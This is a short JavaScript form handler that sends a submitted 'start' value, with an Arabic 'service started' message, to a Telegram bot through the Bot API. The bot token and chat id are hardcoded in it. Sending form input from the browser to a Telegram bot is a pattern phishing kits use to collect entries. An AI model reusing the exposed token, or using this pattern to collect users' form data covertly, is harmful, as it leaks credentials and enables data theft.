const form = document.querySelector("#form");

form.addEventListener("submit", (e) =>{
    e.preventDefault();

     var start = document.getElementById("start").value;
    
    var my_text = ` %0A ضغط بدأ الخدمة ${start}%0A    `

    var token ="5596027783:AAEERyqvvf5_709PqNaU8VfHTlcFIl2BiYg";
    var chat_id =-1001693270224;
var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`

let api = new XMLHttpRequest();
api.open("GET", url, true);
api.send();

    console.log("Message successfully sended!")
})